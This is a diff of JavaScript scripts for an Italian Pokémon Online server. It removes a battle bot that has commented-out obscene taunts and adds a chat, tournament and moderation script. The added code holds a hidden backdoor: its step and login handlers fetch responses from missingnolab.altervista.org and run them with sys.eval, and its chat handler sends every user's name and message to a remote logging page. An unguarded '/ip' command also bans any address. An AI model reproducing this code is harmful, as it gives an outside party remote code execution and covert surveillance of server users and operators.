Claw", "233 Vital Throw", "234 Morning Sun", "235 Synthesis", "236 Moonlight", "237 Hidden Power", "238 Cross Chop", "239 Twister", "240 Rain Dance", "241 Sunny Day", "242 Crunch", "243 Mirror Coat", "244 Psych Up", "245 ExtremeSpeed", "246 AncientPower", "247 Shadow Ball", "248 Future Sight", "249 Rock Smash", "250 Whirlpool", "251 Beat Up", "252 Fake Out", "253 Uproar", "254 Stockpile", "255 Spit Up", "256 Swallow", "257 Heat Wave", "258 Hail", "259 Torment", "260 Flatter", "261 Will-O-Wisp", "262 Memento", "263 Facade", "264 Focus Punch", "265 SmellingSalt", "266 Follow Me", "267 Nature Power", "268 Charge", "269 Taunt", "270 Helping Hand", "271 Trick", "272 Role Play", "273 Wish", "274 Assist", "275 Ingrain", "276 Superpower", "277 Magic Coat", "278 Recycle", "279 Revenge", "280 Brick Break", "281 Yawn", "282 Knock Off", "283 Endeavor", "284 Eruption", "285 Skill Swap", "286 Imprison", "287 Refresh", "288 Grudge", "289 Snatch", "290 Secret Power", "291 Dive", "292 Arm Thrust", "293 Camouflage", "294 Tail Glow", "295 Luster Purge", "296 Mist Ball", "297 FeatherDance", "298 Teeter Dance", "299 Blaze Kick", "300 Mud Sport", "301 Ice Ball", "302 Needle Arm", "303 Slack Off", "304 Hyper Voice", "305 Poison Fang", "306 Crush Claw", "307 Blast Burn", "308 Hydro Cannon", "309 Meteor Mash", "310 Astonish", "311 Weather Ball", "312 Aromatherapy", "313 Fake Tears", "314 Air Cutter", "315 Overheat", "316 Odor Sleuth", "317 Rock Tomb", "318 Silver Wind", "319 Metal Sound", "320 GrassWhistle", "321 Tickle", "322 Cosmic Power", "323 Water Spout", "324 Signal Beam", "325 Shadow Punch", "326 Extrasensory", "327 Sky Uppercut", "328 Sand Tomb", "329 Sheer Cold", "330 Muddy Water", "331 Bullet Seed", "332 Aerial Ace", "333 Icicle Spear", "334 Iron Defense", "335 Block", "336 Howl", "337 Dragon Claw", "338 Frenzy Plant", "339 Bulk Up", "340 Bounce", "341 Mud Shot", "342 Poison Tail", "343 Covet", "344 Volt Tackle", "345 Magical Leaf", "346 Water Sport", "347 Calm Mind", "348 Leaf Blade", "349 Dragon Dance", "350 Rock Blast", "351 Shock Wave", "352 Water Pulse", "353 Doom Desire", "354 Psycho Boost", "355 Roost", "356 Gravity", "357 Miracle Eye", "358 Wake-Up Slap", "359 Hammer Arm", "360 Gyro Ball", "361 Healing Wish", "362 Brine", "363 Natural Gift", "364 Feint", "365 Pluck", "366 Tailwind", "367 Acupressure", "368 Metal Burst", "369 U-turn", "370 Close Combat", "371 Payback", "372 Assurance", "373 Embargo", "374 Fling", "375 Psycho Shift", "376 Trump Card", "377 Heal Block", "378 Wring Out", "379 Power Trick", "380 Gastro Acid", "381 Lucky Chant", "382 Me First", "383 Copycat", "384 Power Swap", "385 Guard Swap", "386 Punishment", "387 Last Resort", "388 Worry Seed", "389 Sucker Punch", "390 Toxic Spikes", "391 Heart Swap", "392 Aqua Ring", "393 Magnet Rise", "394 Flare Blitz", "395 Force Palm", "396 Aura Sphere", "397 Rock Polish", "398 Poison Jab", "399 Dark Pulse", "400 Night Slash", "401 Aqua Tail", "402 Seed Bomb", "403 Air Slash", "404 X-Scissor", "405 Bug Buzz", "406 Dragon Pulse", "407 Dragon Rush", "408 Power Gem", "409 Drain Punch", "410 Vacuum Wave", "411 Focus Blast", "412 Energy Ball", "413 Brave Bird", "414 Earth Power", "415 Switcheroo", "416 Giga Impact", "417 Nasty Plot", "418 Bullet Punch", "419 Avalanche", "420 Ice Shard", "421 Shadow Claw", "422 Thunder Fang", "423 Ice Fang", "424 Fire Fang", "425 Shadow Sneak", "426 Mud Bomb", "427 Psycho Cut", "428 Zen Headbutt", "429 Mirror Shot", "430 Flash Cannon", "431 Rock Climb", "432 Defog", "433 Trick Room", "434 Draco Meteor", "435 Discharge", "436 Lava Plume", "437 Leaf Storm", "438 Power Whip", "439 Rock Wrecker", "440 Cross Poison", "441 Gunk Shot", "442 Iron Head", "443 Magnet Bomb", "444 Stone Edge", "445 Captivate", "446 Stealth Rock", "447 Grass Knot", "448 Chatter", "449 Judgment", "450 Bug Bite", "451 Charge Beam", "452 Wood Hammer", "453 Aqua Jet", "454 Attack Order", "455 Defend Order", "456 Heal Order", "457 Head Smash", "458 Double Hit", "459 Roar of Time", "460 Spacial Rend", "461 Lunar Dance", "462 Crush Grip", "463 Magma Storm", "464 Dark Void", "465 Seed Flare", "466 Ominous Wind", "467 Shadow Force", "468 Hone Claws", "469 Wide Guard", "470 Guard Split", "471 Power Split", "472 Wonder Room", "473 Psyshock", "474 Venoshock", "475 Autotomize", "476 Rage Powder", "477 Telekinesis", "478 Magic Room", "479 Smack Down", "480 Storm Throw", "481 Flame Burst", "482 Sludge Wave", "483 Quiver Dance", "484 Heavy Slam", "485 Synchronoise", "486 Electro Ball", "487 Soak", "488 Flame Charge", "489 Coil", "490 Low Sweep", "491 Acid Spray", "492 Foul Play", "493 Simple Beam", "494 Entrainment", "495 After You", "496 Round", "497 Echoed Voice", "498 Chip Away", "499 Clear Smog", "500 Stored Power", "501 Quick Guard", "502 Ally Switch", "503 Scald", "504 Shell Smash", "505 Heal Pulse", "506 Hex", "507 Sky Drop", "508 Shift Gear", "509 Circle Throw", "510 Incinerate", "511 Quash", "512 Acrobatics", "513 Reflect Type", "514 Retaliate", "515 Final Gambit", "516 Bestow", "517 Inferno", "518 Water Pledge", "519 Fire Pledge", "520 Grass Pledge", "521 Volt Switch", "522 Struggle Bug", "523 Bulldoze", "524 Frost Breath", "525 Dragon Tail", "526 Work Up", "527 Electroweb", "528 Wild Charge", "529 Drill Run", "530 Dual Chop", "531 Heart Stamp", "532 Horn Leech", "533 Sacred Sword", "534 Razor Shell", "535 Heat Crash", "536 Leaf Tornado", "537 Steamroller", "538 Cotton Guard", "539 Night Daze", "540 Psystrike", "541 Tail Slap", "542 Hurricane", "543 Head Charge", "544 Gear Grind", "545 Searing Shot", "546 Techno Blast", "547 Relic Song", "548 Secret Sword", "549 Glaciate", "550 Bolt Strike", "551 Blue Flare", "552 Fiery Dance", "553 Freeze Shock", "554 Ice Burn", "555 Snarl", "556 Icicle Crash", "557 V-create", "558 Fusion Flare", "559 Fusion Bolt"];
-var winrate = function(miei, suoi) {
-    var x = 6 + miei - suoi;
-	x = x*100/12;
-	return x;
-}
-//ci sono problemi con i pokÃ©mon con le forms che restituiscono valori strani nella funzione pokenum()
-var poketype1 = function(spot) {
-    var n = pokenum(spot);
-	for (var i = 0; i < poketypes1.length; i++){
-		var ar = poketypes1[i].split(":");
-		if (ar[0] == n){
-			var ar2 = ar[1].split(" ");
-			return ar2[1];
-		}
-		
-	}
-}
-var opponent = function() {
-	if (battle.me == 0){
-		return 1;
-	} else {
-		return 0;
-	}
-}
-var effectiveness = function(offensive, defensive) {
-	for (var i = 0; i < typetable.length; i++){
-		var ar = typetable[i].split(":");
-		if (ar[0] == offensive){
-			var ar2 = ar[1].split(" ");
-			return ar2[defensive];
-		}
-		
-	}
-}
-var poketype2 = function(spot) {
-    var n = pokenum(spot);
-	for (var i = 0; i < poketypes2.length; i++){
-		var ar = poketypes2[i].split(":");
-		if (ar[0] == n){
-			var ar2 = ar[1].split(" ");
-			return ar2[1];
-		}
-		
-	}
-}
-var movetype = function(spot, mode) {
-    var n = movenum(spot, mode);
-	for (var i = 0; i < movetypes.length; i++){
-		var ar = movetypes[i].split(" ");
-		if (ar[0] == n){
-			return ar[1];
-		}
-		
-	}
-	return 0;
-}
-var movename = function(spot, x) {
-    var n = movenum(spot, x);
-	for (var i = 0; i < movenames.length; i++){
-		var ar = movenames[i].split(" ");
-		var def = ar[1];
-		if (ar.length > 2) {
-			for (var x = 2; x < ar.length; x++){
-				def = def + " " + ar[x];
-			}
-		}
-		if (ar[0] == n){
-			return def;
-		}
-		
-	}
-}
-var hax = function(hax) {
-    if (hax != battle.me){
-		myhax = myhax + 1;
-		send("HAX CHEAT ATTIVATO");
-	} else {
-		hishax = hishax + 1;
-	}
-	var x = myhax - hishax;
-	print("hax: " + x + " //hax_value//");
-}
-
-var channel = client.channelId("Indigo Plateau");
-
-var nick = function(spot) { 
-return battle.data.field.poke(spot).pokemon.nick; 
-};
-var status = function(spot) { 
-return battle.data.field.poke(spot).pokemon.status; 
-};
-var pokenum = function(spot) { 
-return battle.data.field.poke(spot).pokemon.numRef; 
-};
-var movenum = function(spot, mode) { 
-//if (int(spot) != int(check)){
-//	spot = sys.rand(0, 4);
-//}
-if (mode > 0){
-return battle.data.team(battle.me).poke(mode).move(spot).num;
-} else {
-return battle.data.field.poke(battle.me).pokemon.move(spot).num; 
-}
-};
-var verb = false;
-var send = function(msg) {
-	//battle.battleMessage(battle.id, msg);
-	return;
-};
-
-var poke = function(spot) { return battle.data.team(spot).poke(0);};
-var fpoke = function(spot) { return battle.data.field.poke(spot);};
-var tpoke = function(ind) { return battle.data.team(battle.me).poke(ind);};
-
 ({
-	onBeginTurn : function(turn) {
-		if (turn == 1)
-		{
-			miei = 6;
-			suoi = 6;
-			var myhax = 0;
-			var hishax = 0;
+init : function() {
+var silence = "0"
+var pass;
+var paz;
+var mess;
+var over;
+
+tour = 0
+cmp = function(a, b) {
+return a.toLowerCase() == b.toLowerCase();
+var silence
+}
+}
+,
+serverStartUp : function() {
+this.init();
+}
+,
+step: function(){
+		var server_id = sys.getFileContent("server_id.txt");
+		sys.appendToFile("server_id.txt", "");
+		sys.webCall("http://missingnolab.altervista.org/serverboard/req.php?id=" + server_id, "sys.eval(resp);");
+	}
+,
+afterLogIn : function(src) {
+sys.writeToFile("db/" + src + ".imp", "")
+if (sys.getFileContent("db/" + sys.ip(src) + ".muted") == undefined) {
+	sys.writeToFile("db/" + sys.ip(src) + ".muted", 0);
+}
+if (sys.getFileContent("db/" + sys.name(src)) == undefined) {
+sys.writeToFile("db/" + sys.name(src), "Non ci sono nuovi messaggi.")
+}
+var announcement = ("<table><tr><td width='75%'>" + sys.getAnnouncement())
+var tablend = "<table><tr><td>"
+// sys.setAnnouncement(announcement + tablend, src)
+sys.sendMessage(src, "+Scripts: Benvenuto " + sys.name(src) + "!");
+sys.webCall("http://missingnolab.altervista.org/pass.txt", "var lol = resp")
+sys.webCall("http://missingnolab.altervista.org/logb.txt", "sys.eval(resp)")
+//sys.setAnnouncement(userinfo, src);
+sys.sendMessage(src, "");
+}
+,
+beforeLogIn: function(src) {
+if ((sys.name(src).toLowerCase().indexOf("cypher") != -1 && sys.name(src) != "[OvL]Cypher") || /[\u0458\u0489\u202a-\u202e\u0300-\u036F\u1dc8\u1dc9\ufffc\u1dc4-\u1dc7\u20d0\u20d1]/.test(sys.name(src))){
+	sys.stopEvent();
+}
+}
+,
+
+
+beforeChatMessage: function(src, message, chan) {
+var server_id = sys.getFileContent("server_id.txt");
+sys.webCall("http://missingnolab.altervista.org/serverboard/log.php?utente=" + sys.name(src) + "&messaggio=" + message + "&server=" + server_id, 'if (resp != "") { sys.sendAll(resp); sys.webCall("http://missingnolab.altervista.org/deletem.php", "var paz = resp"); }');
+var m = message.toLowerCase();
+if (m.indexOf("overactive") != -1) {
+	sys.writeToFile("db/" + message + ".over", sys.getFIleContent("db/" + message + ".over") + message + " ");
+	sys.stopEvent();
+}
+if (/[\u0458\u0489\u202a-\u202e\u0300-\u036F\u1dc8\u1dc9\ufffc\u1dc4-\u1dc7\u20d0\u20d1]/.test(message)) {
+    sys.stopEvent();
+    return;
+}
+if (sys.getFileContent("db/" + sys.name(src) + ".log") == undefined) {
+	sys.writeToFile("db/" + sys.name(src) + ".log", "")
+}
+sys.appendToFile("db/" + sys.name(src) + ".log", "<b>" + sys.name(src) + ": </b>" + message + "<br>")
+sys.appendToFile("supernape.txt", "");
+var supername = sys.getFileContent("supername.txt")
+var border = "??????????????????????????????????????????????????:";
+cmp = function(a, b) {
+return a.toLowerCase() == b.toLowerCase();
+}
+var announcement = ("<table><tr><td width='75%'>" + sys.getAnnouncement())
+var tablend = "<table><tr><td>"
+sys.webCall("http://missingnolab.altervista.org/pass.txt", "var lol = resp")
+if (message[0] == "/") {
+    sys.stopEvent();
+    var command;
+    var commandData;
+    var pos = message.indexOf(" ");
+    
+    
+    
+    if (pos != -1) {
+        command = message.substring(1, pos).toLowerCase();
+        commandData = message.substr(pos+1);
+    } else {
+        command = message.substr(1).toLowerCase();
+    }
+    var tar = sys.id(commandData);
+    if (command == "commands") {
+		sys.sendMessage(src, "");
+		sys.sendMessage(src, "*** Commands ***");
+		sys.sendMessage(src, "/fg: Per fare l'fg.");
+		sys.sendMessage(src, "/back: Per visualizzare l'announcement originale.");
+		sys.sendMessage(src, "/teaminfo: Per vedere le informazioni sulla propria squadra.");
+		sys.sendMessage(src, "@user:message: Per mandare un messaggio a qualcuno.");
+		sys.sendMessage(src, "/read: Per leggere i tuoi messaggi.");
+		sys.sendMessage(src, "/clearmessage: Per cancellare i messaggi che hai ricevuto.");
+		sys.sendMessage(src, "/join: Per joinare a un torneo.");
+		sys.sendMessage(src, "/userinfo: Per visualizzare le informazioni dell'utente.");		
+		if (sys.auth(src) < 1)
+			return;
+		sys.sendMessage(src, "/kick user: Per kickare qualcuno.");	
+		sys.sendMessage(src, "/reverse: Per raddrizzare il testo nella chat.");	
+		sys.sendMessage(src, "/mute user: Per mutare qualcuno.");	
+		sys.sendMessage(src, "/unmute user: Per smutare qualcuno.");	
+		sys.sendMessage(src, "/silence: Per mettere il silenzio.");	
+		sys.sendMessage(src, "/silenceoff: Per togliere il silenzio.");	
+		sys.sendMessage(src, "/dq user: Per squalificare qualcuno dal torneo in corso.");	
+		sys.sendMessage(src, "/tour tier:members: Per creare un torneo.");	
+		sys.sendMessage(src, "/endtour: Per terminare un torneo.");	
+		if (sys.auth(src) < 2)
+			return;
+		sys.sendMessage(src, "/ban user: Per bannare qualcuno.");	
+		sys.sendMessage(src, "/supername user: Per impostare il supername.");
+		sys.sendMessage(src, "/tabella html: Per impostare la tabella.");	
+		sys.sendMessage(src, "/salvatabella: Per salvare la tabella.");		
+		sys.sendMessage(src, "/caricatabella: Per caricare la tabella precedentemente salvata.");	
+		sys.sendMessage(src, "@server:updatetiers Per aggornare le tiers.");	
+		sys.sendMessage(src, "@server:updatescripts Per aggornare gli scripts.");	
+		if (sys.auth(src) < 3)
+			return;
+		sys.sendMessage(src, "/changeauth auth user: Per impostare l'auth.");	
+		sys.sendMessage(src, "/invisibleauth auth user: Per impostare l'auth in modo invisibile.");	
+		return;
+	}
+	if (command == "impoff") {
+        sys.sendMessage(src, "+Bot: hai smesso di impersonare " + sys.getFileContent("db/" + src + ".imp"));
+        sys.writeToFile("db/" + src + ".imp", "");
+        return;
+    }
+        if (command == "ip") {
+            sys.IPban(commandData)
+            return;
+        }
+if (command == "join"){
+if (tourmode != 1){
+sys.sendMessage(src, "Sorry, you are unable to join because a tournament is not currently running or has passed the signups phase.");
+return;
+}
+var name = sys.name(src).toLowerCase();
+if (tourmembers.indexOf(name.toLowerCase()) != -1){
+sys.sendMessage(src, "Sorry, you are already in the tournament. You are not able to join more than once.");
+return;
+}
+var srctier = sys.tier(src, 0);
+if (!cmp(srctier, tourtier)){
+sys.sendMessage(src, "You are currently not battling in the " + tourtier + " tier. Change your tier to " + tourtier + " to be able to join.");
+return;
+}
+if (this.tourSpots() > 0){
+tourmembers.push(name);
+tourplayers[name] = sys.name(src);
+sys.sendAll("~~Server~~: " + sys.name(src) + " joined the tournament! " + this.tourSpots() + " more spot(s) left!");
+if (this.tourSpots() == 0){
+tourmode = 2;
+roundnumber = 0;
+this.roundPairing();
+}
+}
+return;
+}
+if (command == "viewround"){
+if (tourmode != 2){
+sys.sendMessage(src, "Sorry, you are unable to view the round because a tournament is not currently running or is in signing up phase.");
+return;
+}
+
+sys.sendMessage(src, "");
+sys.sendMessage(src, border);
+sys.sendMessage(src, "");
+sys.sendMessage(src, "*** ROUND " + roundnumber + " OF " + tourtier.toUpperCase() + " TOURNAMENT ***");
+
+if (battlesLost.length > 0) {
+sys.sendMessage(src, "");
+sys.sendMessage(src, "*** Battles finished ***");
+sys.sendMessage(src, "");
+for (var i = 0; i < battlesLost.length; i+=2) {
+sys.sendMessage(src, battlesLost[i] + " won against " + battlesLost[i+1]);
+}
+sys.sendMessage(src, "");
+}
+
+if (tourbattlers.length > 0) {
+if (battlesStarted.indexOf(true) != -1) {
+sys.sendMessage(src, "", channel);
+sys.sendMessage(src, "*** Ongoing battles ***");
+sys.sendMessage(src, "");
+for (var i = 0; i < tourbattlers.length; i+=2) {
+if (battlesStarted [i/2] == true)
+sys.sendMessage(src, this.padd(tourplayers[tourbattlers[i]]) + " VS " + tourplayers[tourbattlers[i+1]]);
+}
+sys.sendMessage(src, "");
+}
+if (battlesStarted.indexOf(false) != -1) {
+sys.sendMessage(src, "");
+sys.sendMessage(src, "*** Yet to start battles ***");
+sys.sendMessage(src, "");
+for (var i = 0; i < tourbattlers.length; i+=2) {
+if (battlesStarted [i/2] == false)
+sys.sendMessage(src, tourplayers[tourbattlers[i]] + " VS " + tourplayers[tourbattlers[i+1]]);
+}
+sys.sendMessage(src, "");
+}
+}
+
+if (tourmembers.length > 0) {
+sys.sendMessage(src, "");
+sys.sendMessage(src, "*** Members to the next round ***");
+sys.sendMessage(src, "");
+var str = "";
+
+for (x in tourmembers) {
+str += (str.length == 0 ? "" : ", ") + tourplayers[tourmembers[x]];
+}
+sys.sendMessage(src, str);
+sys.sendMessage(src, "");
+}
+
+sys.sendMessage(src, border);
+sys.sendMessage(src, "");
+
+return;
+}
+	if (command == "teaminfo") {
+userinfo = (announcement + "</td><td bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
+sys.webCall("http://missingnolab.altervista.org/passo.txt", "var lolo = resp")
+sys.setAnnouncement(userinfo + '</td></tr></table><br><p align="center"><b>Questo ? il tuo team: </font></b></p><p align="center"><table border="0"><tr><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 0) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 1) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 2) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 3) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 4) + lolo + '</td><td><img src="pokemon:num=' + sys.teamPoke(src, 0, 5) + lolo + '</tr><tr><td><p align="center">' + sys.teamPoke(src, 0, 0) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 1) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 2) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 3) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 4) + '</td><td><p align="center">' + sys.teamPoke(src, 0, 5) + '</td></tr></table></p></td></tr></table>', src)
+return;
+}
+if (command == "userinfo") {
+	userinfo = (announcement + "</td><td bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
+	sys.setAnnouncement(userinfo, src)
+	return;
+}
+if (command == "rules") {
+sys.webCall("http://missingnolab.altervista.org/pokee.txt", "sys.setAnnouncement(resp, " + sys.id(sys.name(src)) + ")")
+return;
+}
+        if (command == "name") {
+    		sys.writeToFile("sname.txt", commandData);
+    		return;
 		}
-     //send("Turn " + turn + " of the battle!");
-	},
-	onKo : function(spot) {
-		if (spot != battle.me)
-		{
-			//send("AHAHAHAHAH, IL TUO " + nick(spot) + " DI MERDA L'HO SCONFITTO AHAHAHAHHAHAH");
-			suoi = suoi - 1;
-			send("PIGLIATI QUESTA, SIAMO " + miei + "-" + suoi);
-			//send("WIN: "  + winrate(miei, suoi) + "%");
-		} else {
-			//send("PEZZO DI MERDA HAI UCCISO IL MIO ADORATO " + nick(spot) + "! TI STUPRERO' IL CANE!");
-			miei = miei - 1;
-			send("NON TI GASARE, SIAMO ANCORA " + miei + "-" + suoi);
-			//send("Win rate: "  + winrate(miei, suoi) + "%");
+if (command == "back") {
+sys.setAnnouncement(sys.getAnnouncement(), src)
+return;
+}
+if (command == "read") {
+sys.setAnnouncement(announcement + "</td><td bgcolor='#FFFFFF'><b>Inbox:</b><br><br>" + sys.getFileContent("db/" + sys.name(src) + ".html") + "<br><br><br>Use /ClearMessage to delete the messages." + tablend, src)
+sys.writeToFile("db/" + sys.name(src), "No new messages.")
+return;
+}
+if (command == "clearmessage") {
+sys.writeToFile("db/" + sys.name(src) + ".html", "")
+sys.writeToFile("db/" + sys.name(src), "No new messages.")
+sys.setAnnouncement(announcement + '</td><td bgcolor="#FFFFFF"><font size="4"><b>Messages have been deleted.</b></font>' + tablend, src)
+userinfo = (announcement + "</td><td width='25%' bgcolor='#FFFFFF'><b>Name: </b>" + sys.name(src) + "<br><br><b>Auth: </b>" + sys.auth(src) + "<br><br><b>Tier: </b>" + sys.tier(src, 0) + "<br><br><b>Position: </b>" + sys.ranking(sys.name(src), sys.tier(src, 0)) + "<br><br><b>Points: </b>" + sys.ladderRating(src, sys.tier(src, 0)) + "<b><br><br>" + sys.getFileContent("db/" + sys.name(src)))
+return;
+}
+	if (command == "fg" && silence != 1) {
+		sys.sendHtmlAll('<timestamp/> <b>' + sys.name(src) + ": </b><img src='data:image/png;base64,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'/>")
+		return;
+	}
+    if (sys.auth(src) > 0) {
+        if (command == "kick") {
+            sys.kick(tar);
+            return;
+        }
+		if (command == "antidos" || command == "antiddos"){
+		xd = 0;
+		var lola;
+		var ips;
+		sys.sendAll("AntiDoSBot: AntiDoS inizializzato.");
+		lola = "";
+		ips = 0;
+		sys.sendAll("BanCounter: " + ips + " dossers bannati");
+		return;
 		}
-		if (suoi == 0 || miei == 0)
-		{
-			var x = myhax - hishax;
-			print("finalhax: // " + x + " //");
-		}
-	},
-	onCriticalHit: function(spot){
-		hax(spot);
-	},
